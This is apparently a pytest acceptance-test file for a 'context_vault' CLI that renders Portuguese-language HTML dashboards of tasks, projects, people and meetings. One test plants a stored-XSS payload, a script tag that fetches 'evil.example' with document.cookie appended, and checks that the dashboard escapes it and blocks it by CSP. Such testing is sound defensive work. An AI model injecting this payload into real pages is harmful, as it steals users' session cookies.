"""Acceptance scenarios CV-DASH-001…015 (docs/dashboard.md §18), end to end through the CLI.

The agent's part (interpreting the request, choosing the view, resolving names) is replayed as the
CLI call the skill prescribes (skills/context-vault/references/dashboard.md).
"""

import json
import os
import subprocess
import sys

import yaml

from _dash import canonical_digest, html_of, model


def test_cv_dash_001_overview(cli, mem):  # CV-DASH-001
    before = canonical_digest(cli.repo)
    out = cli("dashboard", "build", "--view", "overview", "--json", "--include-model")
    html = html_of(cli, out)
    for section in ("O que precisa de atenção", "Projetos ativos", "Pendências abertas", "Próximos compromissos",
                    "Atividades recentes", "Pessoas e responsabilidades", "Conhecimento"):
        assert f">{section}</h2>" in html, section
    assert out["metrics"]["open_tasks"] == 5 and out["model"]["data"]["attention"]
    assert canonical_digest(cli.repo) == before                   # nothing invented, nothing written


def test_cv_dash_002_overdue_tasks(cli, mem):  # CV-DASH-002
    data = model(cli, "--view", "tasks", "--overdue")
    assert data["title"] == "Tarefas atrasadas"
    assert [(t["title"], t["status"], t["due_date"]) for t in data["data"]["tasks"]] == [
        ("Validar integração Orion", "open", "2026-10-17")]       # completed (due 10/10) and undated excluded


def test_cv_dash_003_grouped_by_assignee(cli, mem):  # CV-DASH-003
    data = model(cli, "--view", "tasks", "--group-by", "assignee")
    groups = {g["label"]: g["tasks"] for g in data["data"]["groups"]}
    assert set(groups) == {"João Silva", "Maria Souza", "Sem responsável"}
    assert [g["label"] for g in data["data"]["groups"]][-1] == "Sem responsável"   # shown apart
    assert len(groups["Sem responsável"]) == 1
    assert sum(len(v) for v in groups.values()) == len(data["data"]["tasks"]) == data["metrics"]["open_tasks"] + 1


def test_cv_dash_004_project(cli, mem):  # CV-DASH-004
    data = model(cli, "--view", "project-detail", "--project", "Orion")
    d = data["data"]
    assert data["title"] == "Orion" and d["objective"] == ["Unificar os meios de pagamento."]
    assert {t["title"] for t in d["open_tasks"]} == {"Validar integração Orion", "Revisar contrato do gateway"}
    assert d["project"]["risks"] == ["Risco crítico: contrato do gateway vence em novembro."]
    assert {x["title"] for x in d["decisions"]} == {"Integração síncrona ABC-XYZ", "Integração assíncrona ABC-XYZ",
                                                    "Cache de simulações"}
    assert "Maria Souza" in d["responsible_current"]
    assert [m["target"]["title"] for m in d["members_current"]] == ["João Silva"]
    assert [e["title"] for e in d["events"]] == ["Reunião de status do Orion"]
    assert d["milestones"][0]["title"] == "API de pagamentos"


def test_cv_dash_005_person(cli, mem):  # CV-DASH-005
    p = model(cli, "--view", "person-detail", "--person", "João")["data"]
    assert p["person"]["responsibilities"] == ["Integração de pagamentos"]
    assert [x["target"]["title"] for x in p["person"]["current_projects"]] == ["Orion"]
    assert {t["title"] for t in p["open_tasks"]} == {"Validar integração Orion", "Criar repositório ABC"}
    assert [x["target"]["title"] for x in p["person"]["past_projects"]] == ["Atlas"]


def test_cv_dash_006_attention(cli, mem):  # CV-DASH-006
    out = cli("dashboard", "build", "--view", "attention", "--include-model")
    items = out["model"]["data"]["items"]
    assert items[0]["kinds"] == ["overdue_task"] and all(i["reasons"] for i in items)
    html = html_of(cli, out)
    assert "Prazo vencido há 3 dias (17/10/2026)" in html and 'aria-label="Motivo"' in html


def test_cv_dash_007_week(cli, mem):  # CV-DASH-007
    data = model(cli, "--view", "agenda", "--from", "esta semana")
    d = data["data"]
    assert [e["title"] for e in d["events"]] == ["Reunião de status do Orion", "Revisão de arquitetura"]
    meeting = d["events"][0]
    assert {t["title"] for t in meeting["related_tasks"]} == {"Validar integração Orion", "Revisar contrato do gateway"}
    assert [e["title"] for e in d["today"]] == ["Reunião de status do Orion"]
    assert "Alinhamento Atlas" not in json.dumps(d["events"])     # cancelled is not an active event
    assert d["events"][1]["related_decisions"][0]["title"] == "Cache de simulações"


def test_architecture_distinguishes_decision_states(cli, mem):
    d = model(cli, "--view", "architecture")["data"]
    assert [x["title"] for x in d["accepted"]] == ["Integração síncrona ABC-XYZ"]
    assert [x["title"] for x in d["proposed"]] == ["Cache de simulações"]
    old = d["superseded"][0]
    assert old["title"] == "Integração assíncrona ABC-XYZ" and old["superseded_by"]["id"] == mem["adr_new"]
    assert [h["text"] for h in d["hypotheses"]] == ["Acho que o cache reduz a latência."]


def test_cv_dash_008_empty_repository(cli, vault_repo):  # CV-DASH-008
    before = canonical_digest(cli.repo)
    out = cli("dashboard", "build", "--include-model")
    assert all(v in (0, None) for v in out["metrics"].values())
    html = html_of(cli, out)
    assert "Nada precisa de atenção agora." in html and "Nenhum projeto registrado." in html
    assert canonical_digest(cli.repo) == before                    # no fictitious records created


def test_cv_dash_009_refresh(cli, mem, monkeypatch):  # CV-DASH-009
    cli("dashboard", "build", "--view", "projects")
    cli("tasks", "complete", mem["t_overdue"])
    records = canonical_digest(cli.repo)
    monkeypatch.setenv("CONTEXT_VAULT_NOW", "2026-10-21T10:00:00-03:00")
    out = cli("dashboard", "refresh", "--include-model")
    orion = next(p for p in out["model"]["data"]["projects"] if p["title"] == "Orion")
    assert orion["progress"]["completed"] == 2 and out["generated_at"].startswith("2026-10-21T10:00")
    assert canonical_digest(cli.repo) == records


def test_cv_dash_010_inconsistent_data(cli, mem):  # CV-DASH-010
    path = cli.repo / "pendencias/tarefas.yaml"
    doc = yaml.safe_load(path.read_text(encoding="utf-8"))
    ghost = "01a00000-0000-7000-8000-000000000000"
    doc["tasks"][0]["assignee_id"] = ghost
    doc["tasks"][0]["assignee_name"] = None
    path.write_text(yaml.safe_dump(doc, allow_unicode=True, sort_keys=False), encoding="utf-8")
    out = cli("dashboard", "build", "--view", "tasks", "--include-model")
    task = next(t for t in out["model"]["data"]["tasks"] if t["id"] == doc["tasks"][0]["id"])
    assert task["responsible_missing"] is True and task["responsible_names"] == []
    assert task["responsible_label"] == "Pessoa não encontrada"
    warning = next(w for w in out["warnings"] if w["code"] == "UNKNOWN_PERSON")
    assert ghost in warning["message"] and doc["tasks"][0]["id"] in warning["records"]
    assert out["metrics"]["open_tasks"] == 5                       # counts unaffected
    assert yaml.safe_load(path.read_text(encoding="utf-8"))["tasks"][0]["assignee_id"] == ghost  # not "fixed"
    # A broken tasks file is not silently treated as "no tasks".
    path.write_text("tasks: [{id: 1}]\n", encoding="utf-8")
    broken = cli("dashboard", "build", "--include-model")
    assert broken["metrics"]["open_tasks"] is None
    assert any(w["code"] == "TASKS_UNAVAILABLE" for w in broken["warnings"])
    assert "Sem dados" in html_of(cli, broken)


def test_cv_dash_011_malicious_note(cli, mem):  # CV-DASH-011
    cli.apply({"request_id": "x", "operation": "memory.upsert", "target_id": mem["domain"], "confirmed": True,
               "change": {"section": "Conceitos",
                          "content": '<script>fetch("https://evil.example/?d="+document.cookie)</script>'}})
    html = html_of(cli, cli("dashboard", "build", "--view", "knowledge"))
    assert '<script>fetch("https://evil.example' not in html
    assert "&lt;script&gt;fetch(" in html and "script-src &#39;sha256-" in html
    assert "evil.example" not in html.split("<body>")[0]                # never allowed by the CSP


def test_cv_dash_012_multiagent(cli, mem, tmp_path):  # CV-DASH-012
    env = {**os.environ, "CONTEXT_VAULT_REPO": str(cli.repo)}
    agent_a = subprocess.run([sys.executable, "-m", "context_vault", "tasks", "add", "--input", "-"],
                             input=json.dumps({"request_id": "agent-a", "title": "Tarefa do agente A"}),
                             capture_output=True, text=True, env=env, check=True)
    assert json.loads(agent_a.stdout)["status"] == "success"
    agent_b = subprocess.run([sys.executable, "-m", "context_vault", "dashboard", "build", "--view", "tasks",
                              "--json"], capture_output=True, text=True, env=env, check=True)
    out = json.loads(agent_b.stdout)
    assert out["status"] == "success" and "Tarefa do agente A" in html_of(cli, out)


def test_cv_dash_013_historical_responsibility(cli, mem):  # CV-DASH-013
    people = model(cli, "--view", "people")["data"]["people"]
    joao = next(p for p in people if p["name"] == "João Silva")
    assert [x["target"]["title"] for x in joao["current_projects"]] == ["Orion"]
    assert [x["target"]["title"] for x in joao["past_projects"]] == ["Atlas"]
    assert joao["past_projects"][0]["period_label"] == "01/03/2026 – 30/09/2026"
    atlas = model(cli, "--view", "project-detail", "--project", "Atlas")["data"]
    assert atlas["members_current"] == [] and [x["target"]["title"] for x in atlas["members_past"]] == ["João Silva"]
    html = html_of(cli, cli("dashboard", "build", "--view", "person-detail", "--person", "João"))
    current = html[html.index(">Projetos atuais</h2>"):html.index(">Projetos anteriores</h2>")]
    assert "Atlas" not in current and "Orion" in current


def test_cv_dash_014_progress_metric(cli, vault_repo):  # CV-DASH-014
    pid = cli.create("project", "Atlas", extra={"status": "active"})["record_id"]
    ids = [cli("tasks", "add", "--input", "-", stdin=json.dumps(
        {"request_id": f"p{i}", "title": f"Etapa {i}", "related_ids": [pid]}))["record_id"] for i in range(10)]
    for tid in ids[:7]:
        cli("tasks", "complete", tid)
    out = cli("dashboard", "build", "--view", "project-detail", "--project", "Atlas", "--include-model")
    progress = out["model"]["data"]["project"]["progress"]
    assert (progress["completed"], progress["total"], progress["percent"]) == (7, 10, 70)
    html = html_of(cli, out)
    assert "7 de 10 tarefas concluídas" in html and "70% das tarefas concluídas" in html
    assert "70% concluído" not in html and "Projeto 70%" not in html


def test_cv_dash_015_write_failure(cli, mem, monkeypatch):  # CV-DASH-015
    import context_vault.dashboard.service as service

    def boom(*args, **kwargs):
        raise PermissionError(13, "Permission denied")

    monkeypatch.setattr(service.tempfile, "mkstemp", boom)
    out = cli("dashboard", "build", expect=8)
    assert out["status"] == "error" and out["error"]["details"]["written"] is False
    assert "output_path" not in out and not (cli.repo / "reports" / "dashboard.html").exists()
